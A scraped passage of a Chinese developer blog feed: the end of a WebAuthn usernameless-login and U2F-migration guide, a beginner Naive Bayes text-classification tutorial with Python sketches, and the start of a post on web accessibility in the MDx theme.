中发送给依赖方，这样认证器本身就不用存储任何信息。不过，这就导致需要身份认证时，依赖方必须通过用户名找到对应的凭证 ID，将其发送给认证器以供其算出私钥。</p>\n<blockquote><p>Yubikey 实现了一个基于 HMAC 的算法，认证器可以在私钥不离开认证器的前提下（常规的 Key Warp 算法中实际上私钥离开了认证器）通过一些输入和凭证 ID 重新计算私钥，你可以阅读<a href=\"https://www.yubico.com/blog/yubicos-u2f-key-wrapping/\">这篇文章</a>了解更多。</p></blockquote>\n<blockquote><p>客户端通过凭证 ID 查找对应认证器的算法根据系统的不同是不同的。通常凭证 ID 中会包含认证器信息，因此系统可以通过凭证 ID 找到对应的认证器。</p></blockquote>\n<p>要避免输入用户名，我们可以要求认证器将私钥在自己的内存中也存储一份。这样，依赖方无需提供凭证 ID，认证器就可以通过依赖方 ID 找到所需的私钥并签名公钥。以下是具体流程：</p>\n<p>注册时：</p>\n<ol>\n<li>依赖方请求新建凭证，同时要求启用客户端密钥</li>\n<li>认证器生成一对公私钥，并将私钥存储在永久内存中且与依赖方 ID 及用户 ID 绑定，随后将公钥发送给依赖方以供存储</li>\n<li>依赖方将用户 ID 即公钥与用户绑定</li>\n</ol><p>验证时：</p>\n<ol>\n<li>依赖方请求验证，但不必提供除依赖方 ID 以外的更多信息</li>\n<li>用户选择认证器</li>\n<li>认证器根据依赖方 ID 找到对应私钥</li>\n<li>如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录</li>\n<li>确定私钥后，认证器签名挑战并将其返回，同时返回用户 ID</li>\n<li>依赖方通过用户 ID 找到对应用户并用对应公钥检查签名，正确则允许对应用户登录</li>\n</ol><blockquote><p>可以看到，这个特性同时要求认证器存储用户 ID，即上面提到过的 <code>userHandle</code>。依赖方需要根据此信息找到对应用户，因此不支持 <code>userHandle</code> 的 U2F 认证器无法进行无用户名登录。</p></blockquote>\n<blockquote><p>如之前所说，<strong>认证器能永久存储的私钥数量是有限的</strong>，因此只应在真正需要无用户名登录的时候启用此特性。</p></blockquote>\n<blockquote><p>目前暂时没有办法检测认证器是否支持客户端密钥驻留，因此在无用户名验证失败时应 fallback 至常规的 WebAuthn 验证，即向用户询问用户名。</p></blockquote>\n<p>现在让我们来看看如何实现这一特性吧。首先，调用 <code>navigator.credentials.create()</code> 时我们需要注意两个参数：<code>requireResidentKey</code> 必须为 <code>true</code>，<code>userVerification</code> 必须为 \"required\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"5-6\">navigator.credentials.create({\r\n    publicKey: {\r\n        ...\r\n        authenticatorSelection: {\r\n            requireResidentKey: true,\r\n            userVerification: \"required\"\r\n            ...\r\n        },\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Windows Hello <strong>似乎</strong>会存储所有已注册的凭据，因此无论是否指定 <code>requireResidentKey</code>，你都可以通过 Windows Hello 进行无用户名登录。</p></blockquote>\n<p>随后，浏览器会询问用户是否允许认证器存储私钥。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\" alt=\"浏览器提示\" width=\"445\" height=\"285\" class=\"aligncenter size-full wp-image-2208\"></a>\n<p>如果用户同意，认证器会存储私钥，并和普通的 WebAuthn 一样返回信息。不过，依赖方收到数据之后，只需将公钥、用户 ID 与用户关联起来，而不必再将凭证 ID 与用户关联起来。至此注册完成。</p>\n<p>之后，在用户请求登录时，无需再向依赖方提供用户名。同时在传入 <code>navigator.credentials.get()</code> 的参数中也有两个需要注意：<code>userVerification</code> 必须为 \"required\"，同时 <code>allowCredentials</code> 必须为空。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"4-5\">navigator.credentials.get({\r\n    publicKey: {\r\n        ...\r\n        userVerification: \"required\",\r\n        allowCredentials: [],\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Android 暂不支持无用户名验证，空的 <code>allowCredentials</code> 会导致浏览器返回 <code>NotSupportedError</code> 错误。</p></blockquote>\n<p>此时，认证器会根据依赖方 ID 找到对应的私钥。如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录。用户选择后，认证器就会使用对应的私钥签名挑战并将其返回。此时，<code>userHandle</code> 一定不为空。</p>\n<p>依赖方收到数据后，需要将 <code>userHandle</code> 作为用户 ID 找到对应的用户，并使用对应的公钥验证签名。如果验证成功，则认为对应的用户身份认证成功，依赖方可以允许其登录。至此验证结束。</p>\n<blockquote><p>有的时候你可能会需要清除认证器中的密钥。绝大多数认证器都提供了对应的软件以供清除存储的密钥，但大部分情况下这会重置整个认证器，这意味着相关认证器此前的所有凭证均会失效。因此建议不要将日常使用的认证器作为开发测试用的认证器。</p></blockquote>\n<h2>从 U2F 认证迁移</h2>\n<p>如果你的服务此前提供了 U2F 第二因素认证，你可能会希望在将依赖方从 U2F 升级到 WebAuthn 时用户此前注册的 U2F 认证器仍然可用而无需重新注册。由于 WebAuthn 向后兼容 U2F 设备，用户是可以继续使用原有的 U2F 认证器的。不过，由于 WebAuthn 的依赖方 ID 与 U2F 的 <code>appid</code> 并不一定相同，你需要将原有的 U2F <code>appid</code> 随 WebAuthn 流程一起传递给认证器，认证器才能使用正确的私钥进行响应。</p>\n<p>要实现这一点，我们只需要在注册及认证仪式中使用 WebAuthn 的 <code>appid</code> 扩展。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    appid: \"https://example.com\" //U2F appid\r\n}</pre>\n<p>此时认证器便可以得到正确的私钥，之后的流程与正常情况一致；依赖方除了正常的 WebAuthn 流程外，不需要再做任何其它操作。</p>\n<h2>拓展阅读</h2>\n<p>我们的 WebAuthn 之旅到这里就真的结束了。不过，你仍然可以自行探究，了解更多。<strong>本文只是一个粗浅的使用指南</strong>，而被称为“Web 身份认证的未来”的 WebAuthn 的深层还要很多细节值得我们挖掘学习，不过本文不会再继续讨论了。</p>\n<p>如果你想了解更多关于 WebAuthn 的信息，最好的方法是直接阅读 <a href=\"https://www.w3.org/TR/webauthn\">W3C 规范</a>。此外，Yubico 也提供了不错的 <a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn 文档</a>。</p>\n<p>要了解更多认证器存储凭证的信息，你可以阅读<a href=\"https://duo.com/labs/tech-notes/how-security-keys-store-credentials\">这篇文章</a>（英文）。</p>\n<p>如果你想了解更多 Android Safety Net 是怎样运作的，可以观看<a href=\"https://youtu.be/8lv_9mydrjg\">这个视频</a>，并通过 <a href=\"https://developer.android.com/training/safetynet/attestation\">Google 的文档</a>了解 Android Safety Net 的更多信息。</p>\n<p>如果你想方便地调试 WebAuthn，<a href=\"https://webauthn.me/\">webauthn.me</a> 提供了一个非常直观方便的<a href=\"https://webauthn.me/debugger\">调试器</a>。</p>\n<h1>参考资料</h1>\n<p><a href=\"https://www.w3.org/TR/webauthn\">WebAuthn Level 1 规范 - W3C</a><br><a href=\"https://github.com/w3c/webauthn\">WebAuthn Level 2 草案 - W3C</a><br><a href=\"https://blog.techbridge.cc/2019/08/17/webauthn-intro/\">一起来了解Web Authentication - TechBridge 技术共笔部落格</a><br><a href=\"https://medium.com/@herrjemand/introduction-to-webauthn-api-5fd1fb46c285\">Introduction to WebAuthn API - Medium</a><br><a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">WebAuthn/FIDO2: Verifying responses - Medium</a><br><a href=\"https://obeta.me/posts/2019-03-01/WebAuthn%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\">WebAuthn介绍与使用 - obeta</a><br><a href=\"https://webauthn.io/\">webauthn.io</a><br><a href=\"https://webauthn.guide/\">webauthn.guide</a><br><a href=\"https://webauthn.me/\">webauthn.me</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion\">Attestation and Assertion - MDN</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Authentication_API\">Web Authentication API - MDN</a>（顺便翻译了一半）<br><a href=\"https://fidoalliance.org/fido-technotes-the-truth-about-attestation/\">FIDO TechNotes: The Truth about Attestation - FIDO Alliance</a><br><a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn Developer Guide - Yubico</a><br><a href=\"https://en.wikipedia.org/wiki/WebAuthn\">WebAuthn - Wikipedia</a><br><a href=\"https://techcommunity.microsoft.com/t5/identity-standards-blog/all-about-fido2-ctap2-and-webauthn/ba-p/288910\">All about FIDO2, CTAP2 and WebAuthn - Microsoft Tech Community</a><br><a href=\"https://webauthn-doc.spomky-labs.com/\">Webauthn Framework</a><br><a href=\"https://zhuanlan.zhihu.com/p/25279015\">如何开发支持 FIDO U2F 登录的网站 - 知乎专栏</a><br></p></pre>\n","link":"https://flyhigher.top/develop/2160.html"},{"title":"NLP 找门：用朴素贝叶斯进行文本分类","date":"2020-01-29 11:39:58","description":"\n<blockquote>\n<p>有一天，神收到了一封垃圾邮件，于是世界上就有了朴素贝叶斯算法。</p>\n<footer>——我瞎编的</footer>\n</blockquote>\n<p>为什么这篇文章的标题是 NLP 找门呢？因为如果你看完了这篇文章，你就可以<strong>准备入门</strong>自然语言处理 (<strong>N</strong>atural <strong>L</strong>anguage <strong>P</strong>rocessing) 了。我会把这篇文章当作一篇彻彻底底的 NLP 入门文章来写，尽量避免“专业高端”词汇和“全是奇怪符号”的式子，这样<strong>只要你有高中数学基础</strong>，就能毫无压力地看完这篇文章，学会使用朴素贝叶斯分类算法分类文本。</p>\n<p>让我们开始吧。</p>\n<h1>所以，啥是朴素贝叶斯？</h1>\n<p>简单来说，朴素贝叶斯 (Naïve Bayes) <strong>是一个简单但高效的分类算法</strong>，在进行不复杂的文本分类时高效且拥有不低的准确度，判断垃圾邮件就是用朴素贝叶斯进行文本分类的一个经典例子。当然朴素贝叶斯分类不仅能用在 NLP 中，在许多分类问题中朴素贝叶斯也有非常好的效果，但我们今天只关注它在 NLP 中的应用。</p>\n<p>要了解朴素贝叶斯，我们要先来了解一下贝叶斯定理。</p>\n<blockquote>\n<p>每增加一个数学公式都会使读者减半。</p>\n<footer>——霍金</footer>\n</blockquote>\n<p>那么，就让我们先来看看贝叶斯定理的公式吧（笑</p>\n<p>$$P(A|B) = \\frac{P(AB)}{P(B)} = \\frac{P(B|A)P(A)}{P(B)}$$</p>\n<p>其实还是很简单的，运用高中的条件概率知识就能理解。本质上，贝叶斯定理给出了一种方法，使得我们可以在 \\(P(A|B)\\) 和 \\(P(B|A)\\) 之间互相转换，因为通常情况下它们是不一样的。</p>\n<p>要更好地理解，请考虑这样一个例子：</p>\n<blockquote><p>假设有一个学校图书馆，图书管理员正为找不到某本书而发愁。已知老师有 70% 的意愿借走这本书，而是学生的意愿是 30%，这个学校的师生比例是 1:10，那么借走这本书的人是老师的概率有多大？</p></blockquote>\n<p>设学校总人数为 \\(T\\)，我们可以很容易地写出这样的一个式子：</p>\n<p>$$\\begin{align} P &amp; = \\frac{T\\cdot\\frac{1}{11}\\cdot 70\\%}{T\\cdot\\frac{1}{11}\\cdot 70\\%+T\\cdot\\frac{10}{11}\\cdot 30\\%} \\\\ &amp; = \\frac{70\\%}{70\\%+10\\times30\\%} \\\\ &amp; = \\frac{7}{37} \\end{align}$$</p>\n<p>这就是贝叶斯定理了！等等，你可能会挠挠头，这哪里是贝叶斯了？别急，如果我们把最上面的式子换个字母的话…</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>在这里，\\(H\\) 指 Hypothesis，即假设，而 \\(E\\) 指 Evidence，即证据。这样，这个式子就很好理解了，在我们上面的例子里，借走书是证据，那么 \\(P(E)\\) 就是某个人选择借走这本书的概率；这个人是老师是假设，那么这个人是老师的概率是 \\(P(H)\\)。<strong>注意这里的概率指在学校中抽一个人是老师的概率，并不是“在借走书的前提下”这个人是老师的概率</strong>，而“在借走书的前提下”这个人是老师的概率应该是 \\(P(H|E)\\)，也正是我们要求的概率。同样地，而“这个人是老师”的前提下借走书的概率就是 \\(P(E|H)\\) 了。</p>\n<p>那么再来看看上面我们凭小学知识就列出的计算式，如果把里面的具体数据换成概率来表示的话，这个式子就会变成…</p>\n<p>$$P(H|E) = \\frac{T\\cdot P(E|H)P(H)}{T\\cdot P(E|H)P(H) + T\\cdot P(E|\\neg H)P(\\neg H)}$$</p>\n<p>好吧，这里解释一下，\\(\\neg\\) 符号表示“非”，所以 \\(P(E|\\neg H)\\) 表示在“这个人不是老师”的前提下借走书的概率。而 \\(T\\cdot P(E|H)P(H)\\) + \\(T\\cdot P(E|\\neg H)P(\\neg H)\\)，即“可能借走书的老师的数量 + 可能借走书的学生的数量”，就是“可能借走书的人的数量”了，也就是 \\(T\\cdot P(E)\\)。上下消去 \\(T\\)，我们就能得到上面的式子了。</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>这就是贝叶斯了定理。如果你还是不太清楚，可以去看看 3Blue1Brown 的<a href=\"https://www.bilibili.com/video/av84799361\">这个视频</a>，图形化的讲解会清晰很多。</p>\n<p>这里我要提一下这个式子里各部分的专有名称了（“专业高端”词汇警告），你可以不记住，直接看后面。</p>\n<ul>\n<li>\\(P(H|E)\\) 叫做 \\(H\\) 的<strong>后验概率</strong>，反之亦然</li>\n<li>\\(P(H)\\) 叫做 \\(H\\) 的<strong>先验概率</strong>，反之亦然</li>\n<li>特别地，我们把 \\(P(E|H)\\) 称作<strong>“似然值”</strong>，即 likelihood</li>\n</ul>\n<p>那什么是朴素贝叶斯呢？按上面所说的，朴素贝叶斯是一种分类算法。简单来说，朴素贝叶斯将一个对象的各个特征考虑为互相独立，然后根据这些特征的概率的乘积来判断对象所属的分类。基本原理如下：</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)} \\propto P(E|H)P(H) = P(H)\\prod_{i}P(W_i|H)$$</p>\n<p>在这里，\\(W_i\\) 指某一对象的第 \\(i\\) 个特征，对于文本分类来说，这就是一段文本中的某个单词。</p>\n<p>朴素贝叶斯之所以“朴素”，是因为它要求<strong>各个特征间是独立的</strong>，在文本分类中也就是各个单词之间互不干扰。虽然思路简单的代价是适用范围变窄，不过由于这样的简化在很多情况下已经足够了，因此实际上朴素贝叶斯的应用范围非常广。<del>你看朴素贝叶斯 <strong>N</strong>aïve <strong>B</strong>ayes 的缩写都是 NB 了，能不厉害吗（逃</del></p>\n<h1>那么，咋分类啊</h1>\n<p>看来你这下完全听懂了呢（笑），是时候看看如何在 NLP 中应用朴素贝叶斯了。和上面一样，我们用一个具体的例子来说明。我们的目标是让电脑学会分类美国共和党和民主党的演讲稿，由于两个党派的演讲风格不同，所以这样的分类在理论上是可行的。</p>\n<div class=\"wp-block-file\">\n<a href=\"https://acdn.flyhigher.top/nlp/material.zip\" download>material.zip</a><a href=\"https://acdn.flyhigher.top/nlp/material.zip\" class=\"wp-block-file__button\" download>下载</a>\n</div>\n<p>上面我们要用到的数据集，你可以下载下来一起动手玩一玩。先说一下数据集的数据结构吧，压缩包里有两个文件，<code>train.txt</code> 将会被当作训练数据集，而 <code>test.txt</code> 则会作为训练结束后的验证数据集。两个文本文件里数据的结构是类似的，就像这样：</p>\n<pre class=\"EnlighterJSRAW\">BLUE WELL I AM SO HONORED AND PERSONALLY UNKNOWNWORD TO BE HERE...\r\nRED THANK YOU . THIS IS QUITE AN INSTITUTION . IT'S GOOD TO BE...</pre>\n<p>每行都是一篇演讲稿，每行的第一个单词指明了这篇演讲稿所属的党派，<code>RED</code> 指共和党，而 <code>BLUE</code> 指民主党。所有单词和符号都已经被转为大写并由空格分隔方便处理。<code>train.txt</code> 有共和党演讲稿和民主党演讲稿各 23 篇，<code>test.txt</code> 有 6 篇共和党演讲稿，12 篇民主党演讲稿。</p>\n<p>明白了？那我们就开始吧。</p>\n<h2>捋捋思路</h2>\n<p>首先，我们需要考虑如何在文本分类中应用朴素贝叶斯。很简单，按朴素贝叶斯的思路，<strong>计算每个词在某一分类下的出现概率，然后将某篇文章的所有词的概率相乘，再乘以该分类的先验概率，就可以得到某篇文章在某一分类下的概率。</strong></p>\n<p>$$P(Class|Article) = P(Class)\\prod_{i}P(Word_i|Class)$$</p>\n<p>各个分类概率都计算完成后，概率最高的那个分类就是这篇文章可能所属的分类。这个思路的核心就是用词决定了文本风格，文本的不同类别用词会有差异，只要能量化这些差异就可以分类文本。在我们的例子中，我们可以从 <code>train.txt</code> 中统计各个词汇的出现情况，然后用 <code>test.txt</code> 中的数据按上面的算法验证我们算法的准确性。</p>\n<p>这个思路很简单也很清晰，但还有一些问题需要解决。<strong>第一，有的时候，我们的测试数据集中可能会出现一个在训练数据集中没有出现过的词语。这个时候，朴素贝叶斯的计算结果会是 0。</strong>如果我们把 0 乘进式子中，那就别想得到正常的结果了。所以，我们还需要对计算某一单词在某一分类中的式子稍加改进。使用拉普拉斯平滑，就可以避免出现概率为 0 的情况。别被名字吓到，拉普拉斯平滑是一种非常简单的平滑方法：在分子上 +1，在分母上加整个取值范围，这样就可以给整个分式加上非常微小的偏移，避免出现 0。</p>\n<p>$$\\begin{align} P(Word_i|Class) &amp; = \\frac{Word_iCountInClass}{AllWordCountInClass} \\\\ &amp; \\approx \\frac{Word_iCountInClass + 1}{AllWordCountInClass + UniqueWordCount} \\end{align}$$</p>\n<p><strong>第二，对于长文本，大部分词语在某一分类中的出现概率是远小于 1 的，加上长文本词汇量大，往往概率相乘的结果会非常小。</strong>受限于计算机处理浮点数的原理，精确处理这么小的数字是很麻烦的。幸好，运用一些简单的数学知识就可以将其转化为更精确的表达，<strong>那就是取对数。</strong></p>\n<p>首先，将概率计算结果取对数并不影响我们的计算结果。因为取对数是一个单调递增的操作，而我们计算概率只是为了排序选择概率最高的分类，因此取对数是不影响我们排序的。而把多项式取对数，等于把多项式的每一项取对数后相加。所以我们有：</p>\n<p>$$\\lg{\\Big(P(Class)\\prod_{i}P(Word_i|Class)\\Big)} = \\lg{P(Class)} + \\sum_i\\lg{P(Word_i|Class)}$$</p>\n<p>大部分情况下，在每一次取对数的时候，要取对数的数字的大小，即 \\(P(Word_i|Class)\\) 尚还在计算机能处理的范围内，<strong>因此我们可以放心地使用取对数的方法</strong>，避免计算机精度不够影响结果。</p>\n<p><strong>第三就是在某些情况下，可能会有部分词语干扰计算结果</strong>，如 and, is 这类的被大量使用的中性词。如果希望得到更好的结果，我们可以维护一个停用词表，在计算时排除停用词即可。或者，我们可以在计算完每个单词的出现数量后，排除数量最多的前 \\(N\\) 个单词，避免这些单词过多地影响计算。</p>\n<h2>写点代码</h2>\n<p>现在我们终于可以开始实战，写点代码了。我会用简单的 Python 来表达思路。好了，理一理思绪，第一步我们要做的，是统计训练数据集中的用词情况。具体来说，根据上面的思考，我们需要统计的有：</p>\n<ul>\n<li>每个单词在各分类中出现的数量</li>\n<li>各分类中的不重复词数量</li>\n</ul>\n<p>用 Python 简单表示如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">#读入数据过程略...\r\ndata_raw = \"读入的数据\".split('\\n') #按行分隔\r\ndata_blue = []\r\ndata_red = []\r\nword_count_blue = {}\r\nword_count_red = {}\r\n\r\nfor line_data in data_raw:\r\n    word_list = line_data.split(\" \") #分隔单词\r\n    if word_list[0] == \"BLUE\":\r\n        for i in range(1,len(word_list)):\r\n            if not is_excluded(word_list[i]): #判断是否为停用词\r\n                data_blue.append(word_list[i])\r\n                #统计单词出现次数\r\n                word_count_blue.setdefault(word_list[i], 0)\r\n                word_count_blue[word_list[i]] += 1\r\n    elif if word_list[0] == \"RED\":\r\n        #Class = red 时同理...\r\n\r\n#统计非重复词\r\nunique_words_blue = list(set(data_blue))\r\nunique_words_red = list(set(data_red))</pre>\n<p>训练过程到这里就结束了，计算机已经知道了各政党演讲的用词习惯。很简单吧？接下来我们就要使用测试数据集来测试准确度了。<strong>这里开始就涉及到朴素贝叶斯的计算了</strong>，可能会稍微复杂一点点。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">import math\r\n#读入测试数据过程略...\r\ntest_data_raw = \"读入的数据\".split('\\n') #按行分隔\r\ntest_data = []\r\n\r\nfor for line_data in test_data_raw:\r\n    if line_data[0] == \"BLUE\":\r\n        content_data = line_data.split(\" \").pop(0)\r\n        test_data.append({\"class\": \"blue\", \"content\": content_data})\r\n\r\nfor line_data in test_data:\r\n    if line_data[\"class\"] == 'blue':\r\n        posibility_blue = 0\r\n        for word in line_data[\"content\"]:\r\n            #计算各单词概率，取对数后相加，使用了拉普拉斯平滑\r\n            if word in word_count_blue:\r\n                posibility_blue += math.log((word_count_blue[word]+1)/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n            else:\r\n                posibility_blue += math.log(1/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n        #最后加上该分类概率的对数\r\n        posibility_blue += math.log(len(data_blue/((len(data_blue)+(len(data_red)))\r\n    elif line_data[\"class\"] == 'red':\r\n        #Class = red 时同理...</pre>\n<p>计算完成后，我们就得到每篇演讲稿在各分类下的概率了。之后，简单的比较就能得出推断的分类：如果 \\(P(Red|Article)\\) 大于 \\(P(Blue|Article)\\)，那么这篇演讲稿就更可能是共和党的演讲稿，反之则是民主党的演讲稿。</p>\n<p>很好理解吧？那么这么简单的思路，准确性怎么样呢？对于我们的例子，这是我设置了个别停用词后的结果：</p>\n<pre class=\"EnlighterJSRAW\">+-----+-------+--------------+--------------+-------+-------+\r\n|   ID|  Class|        P(Red)|       P(Blue)|  Guess| Status|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|    1|   Blue|  -23204.68377|  -22998.67066|   Blue|      √|\r\n|    2|   Blue|  -16438.44625|  -16137.48257|   Blue|      √|\r\n|    3|   Blue|  -33468.81214|  -32567.61801|   Blue|      √|\r\n|    4|   Blue|    -8606.2193|   -8601.50426|   Blue|      √|\r\n|    5|   Blue|  -12430.97436|  -11935.70662|   Blue|      √|\r\n|    6|   Blue|  -44033.02883|  -43877.55367|   Blue|      √|\r\n|    7|   Blue|   -16947.2851|  -16758.57542|   Blue|      √|\r\n|    8|   Blue|  -26957.26997|  -26889.62444|   Blue|      √|\r\n|    9|   Blue|  -27503.73985|  -27249.21828|   Blue|      √|\r\n|   10|   Blue|   -20528.4457|   -19991.1248|   Blue|      √|\r\n|   11|   Blue|  -20337.96493|  -19860.12831|   Blue|      √|\r\n|   12|   Blue|  -28409.28489|  -28118.98017|   Blue|      √|\r\n|   13|    Red|  -13756.01015|  -14488.11751|    Red|      √|\r\n|   14|    Red|  -17221.22732|  -17710.15936|    Red|      √|\r\n|   15|    Red|  -17397.45136|  -17899.98659|    Red|      √|\r\n|   16|    Red|  -10724.69095|  -11092.77837|    Red|      √|\r\n|   17|    Red|  -10402.40027|  -10859.48681|    Red|      √|\r\n|   18|    Red|   -9371.53792|    -9669.6769|    Red|      √|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|                                      Total: 18/18, 100.0% |\r\n+-----------------------------------------------------------+</pre>\n<p><strong>100% 的准确率哦！</strong>事实上，对于我们的这个例子，就算不设置停用词，我们仍能达到 100% 的分类准确率。朴素贝叶斯分类的确很 NB 呢。</p>\n<h1>更进一步</h1>\n<p>我们的探索到这里就结束了，但如果你有兴趣，完全可以继续探索下去。我们的例子是一个非常简化的例子，在实际情况中，还有很多问题需要解决。比如，对于中文及类似语言，不存在拉丁语系的天然分词结构，而朴素贝叶斯的文本分类是基于单词的，那么<strong>中文的分词就会是个问题；</strong>再比如，对于朴素贝叶斯分类来说，<strong>词语之间的顺序是不影响分类结果的</strong>，但这就会导致“今天心情很好，但昨天不好”和“昨天心情很好，但今天不好”在朴素贝叶斯看来是一样的，要想获得更好的结果，我们必须<strong>考虑词语的顺序。</strong></p>\n<p>这些问题，今天我们就不再深究了，但你可以自己探索。比如，引入思路同样很简洁的马尔科夫链，我们就可以让计算机学会考虑词语间的顺序，不过那就会是另一个话题了。</p>\n","link":"https://flyhigher.top/develop/1989.html"},{"title":"MDx 中增强页面可访问性的细节","date":"2020-01-25 16:45:04","description":"\n<blockquote><p>这篇文章本来是打算发在 <a href=\"https://mdxblog.flyhigher.top/\">MDx Blog</a> 的，不过写到后来发现这篇文章相对来说还是有价值的，于是就将这篇文章转移到了无垠，MDx Blog 则不再发表这篇文章。</p></blockquote>\n<p>从 MDx 开发之初，增强页面的可访问性就被列为了一个重要目标。从 HTML 语义化，到 ARIA 地标，再到 <code>prefers-reduced-motion</code>，随着浏览器对于增强页面可访问性的支持功能越来越多，MDx 也在不断地更新，让更多的人都能毫无困难地浏览、查看由 MDx 渲染的网页。本文会详细说明一些 MDx 中增强页面可访问性的细节，<strong>如果你希望增强自己开发的网页的可访问性，本文可能会对你有所帮助。</strong></p>\n<h1>基础性增强</h1>\n<p>增强可访问性，最重要也是最基础的一点就是 HTML 语义化。通过使用 HTML 5 语义化标签和 ARIA Role 标签，我们可以很方便地<strong>将整个网页在语义上分为几部分，而这将有效地改善屏幕阅读器对网页的分析质量，使视力障碍用户更好地浏览网页。</strong></p>\n<h2>HTML 语义化</h2>\n<p><strong>HTML 语义化属于增强页面可访问性的基础中的基础。</strong>通过使用语义化的 HTML 标签，我们可以方便地为网页中的各部分标记功能而不影响页面样式。随着符合 HTML 5 的现代化网页成为主流，语义化标签已被很大一部分网站所支持，我也不过多赘述了。就举几个常用的“地标性”标签吧：</p>\n<ul>\n<li>\n<code>header</code> 标签标记页眉，默认样式同 <code>div</code>，不要把它和 <code>head</code> 搞混了</li>\n<li>\n<code>main</code> 标签标记页面的主要内容，默认样式同 <code>div</code>\n</li>\n<li>\n<code>article</code> 标签标记文章（在 HTML 5 中它指任何独立或可复用的文本），默认样式同 <code>div</code>\n</li>\n<li>\n<code>footer</code> 标签标记页脚，默认样式同 <code>div</code>\n</li>\n<li>\n<code>nav</code> 标签标记页面导航栏区域，默认样式同 <code>div</code>\n</li>\n<li>\n<code>aside</code> 标签标记侧栏，默认样式同 <code>div</code>\n</li>\n<li>\n<code>section</code> 标签标记“一组内容”，你可以把它看作是划定网页中一块区域的通用标签，默认样式同 <code>div</code>\n</li>\n</ul>\n<p>只要用这些标签替代 <code>div</code> 而不是无脑使用 <code>div</code> 就能提高页面的可访问性。MDx 使用了这些标签来增强页面的可访问性。</p>\n<h2>下一步，ARIA</h2>\n<p>有的时候，出于一些原因，我们没法使用语义化的 HTML 标签，或者没有合适的语义化标签来标记内容，这时候<strong>我们就需要使用 ARIA (Accessible Rich Internet Applications，可访问的富互联网应用)。</strong>ARIA 的基础用法很简单，只要在相应元素上加上 <code>role</code> 属性指定该元素的功能即可。下面是一个简单的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;div role=\"navigation\"&gt;\r\n  &lt;ul&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page A&lt;/a&gt;&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page B&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page C&lt;/a&gt;&lt;/li&gt;\r\n  &lt;/ul&gt;\r\n&lt;/div&gt;</pre>\n<p>通过 <code>role=\"navigation\"</code>，我们把一个 <code>div</code> 标记为了导航栏区域。实际上，对屏幕阅读器来说，这和 <code>nav</code> 标签在语义上是一致的。上一节中的例子都可以分别用以下 ARIA Role 表示：</p>\n<ul>\n<li><code>role=\"heading\"</code></li>\n<li><code>role=\"main\"</code></li>\n<li><code>role=\"article\"</code></li>\n<li><code>role=\"contentinfo\"</code></li>\n<li><code>role=\"navigation\"</code></li>\n<li><code>role=\"complementary\"</code></li>\n<li><code>role=\"region\"</code></li>\n</ul>\n<p>除此以外，MDx 还使用了 <code>role=\"banner\"</code> 和 <code>role=\"search\"</code> 来分别标记页面中的顶部栏和搜索表单。另外，<strong>有的时候 <code>role</code> 属性还需配合 <code>aria-*</code> 属性一同使用</strong>，具体规则比较复杂，我就不在这里赘述了，具体可参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles\">WAI-ARIA Roles – MDN</a>。</p>\n<h1>媒体查询来帮忙</h1>\n<p>CSS 的媒体查询其实是一个非常强大的特性，<strong>妥善利用其中的一些特性，我们可以在网页外观上大大增强网页的可访问性。</strong>除了已经烂大街的“对浏览器窗口大小”响应的媒体查询，我会介绍 3 个很少有网站充分利用的媒体查询。</p>\n<h2>print</h2>\n<p><code>print</code> 媒体查询其实已经“历史悠久”了，<strong>只要使用 <code>@media print {...}</code> 就可以创建只在打印页面时生效的样式。</strong>通过这种方式，我们可以让页面在打印时应用一套为打印优化的样式，增强页面在物理纸张上的可访问性。</p>\n<blockquote><p>维基百科是对打印样式做了单独适配的著名例子。</p></blockquote>\n<p><strong>由于在打印的情况下，页面已经离开了“可交互”的范围，还有分页这种在屏幕中无需考虑的问题，要让页面在物理纸张上仍能被轻松地阅读，我们需要做一些特殊的适配。</strong>直接来看一个例子吧。以下是 MDx 针对打印情况进行的一些特殊优化，样式的具体理由已经写在了注释中。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media print {\r\n    /*隐藏不必要的元素*/\r\n    header, .mdx-ad-after-article, .mdx-ad-in-article, .mdx-post-money, .page-footer-nav, .mdx-same-posts, .spanout button, .mdui-drawer, .mdui-overlay, .mdui-menu, .mdx-share-img-dialog, .mdx-share-wechat-dialog {\r\n        display: none!important;\r\n    }\r\n\r\n    /*使用下划线标记链接*/\r\n    article a {\r\n        text-decoration: underline!important;\r\n    }\r\n    /*由于纸张不可交互，在链接后显示链接到的 